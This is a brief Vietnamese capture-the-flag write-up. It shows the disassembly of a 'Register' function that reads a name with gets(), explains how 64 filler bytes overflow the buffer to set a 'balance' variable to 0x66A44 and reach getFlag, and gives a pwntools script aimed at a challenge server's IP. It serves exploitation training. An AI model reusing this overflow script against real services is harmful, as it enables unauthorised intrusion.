Hàm **Register**:

```asm
.text:08048531 ; =============== S U B R O U T I N E =======================================
.text:08048531
.text:08048531 ; Attributes: bp-based frame
.text:08048531
.text:08048531                 public Register
.text:08048531 Register        proc near               ; CODE XREF: main+30↓p
.text:08048531
.text:08048531 s               = byte ptr -4Ch
.text:08048531 var_C           = dword ptr -0Ch
.text:08048531 var_4           = dword ptr -4
.text:08048531
.text:08048531 ; __unwind {
.text:08048531                 push    ebp
.text:08048532                 mov     ebp, esp
.text:08048534                 push    ebx
.text:08048535                 sub     esp, 54h
.text:08048538                 call    __x86_get_pc_thunk_bx
.text:0804853D                 add     ebx, 1AC3h
.text:08048543                 mov     [ebp+var_C], 0
.text:0804854A                 sub     esp, 0Ch
.text:0804854D                 lea     eax, (aPleaseEnterYou - 804A000h)[ebx] ; "[+] Please enter your name: "
.text:08048553                 push    eax             ; format
.text:08048554                 call    _printf
.text:08048559                 add     esp, 10h
.text:0804855C                 sub     esp, 0Ch
.text:0804855F                 lea     eax, [ebp+s]
.text:08048562                 push    eax             ; s
.text:08048563                 call    _gets
.text:08048568                 add     esp, 10h
.text:0804856B                 sub     esp, 8
.text:0804856E                 push    [ebp+var_C]
.text:08048571                 lea     eax, (aThanksForTheRe - 804A000h)[ebx] ; "[+] Thanks for the registration, your b"...
.text:08048577                 push    eax             ; format
.text:08048578                 call    _printf
.text:0804857D                 add     esp, 10h
.text:08048580                 cmp     [ebp+var_C], 66A44h
.text:08048587                 jnz     short loc_804858E
.text:08048589                 call    getFlag
.text:0804858E
.text:0804858E loc_804858E:                            ; CODE XREF: Register+56↑j
.text:0804858E                 nop
.text:0804858F                 mov     ebx, [ebp+var_4]
.text:08048592                 leave
.text:08048593                 retn
.text:08048593 ; } // starts at 8048531
.text:08048593 Register        endp
```

Biến `name` nằm ở địa chỉ ebp - 0x4c, biến `balance` nằm ở địa chỉ ebp - 0xc. Để fill hết `name` cần `64` ký tự, tiếp sau đó là 4 ký tự `\x44\x6a\x06\x00` để thay đổi giá trị biến `balance`.

Get flag script:

```python
from pwn import *

r = remote('61.28.237.24', 30203)
print(r.recvuntil('Please enter your name: '))
r.sendline(b'a' * 64 + p32(0x66A44))
print(r.interactive())
```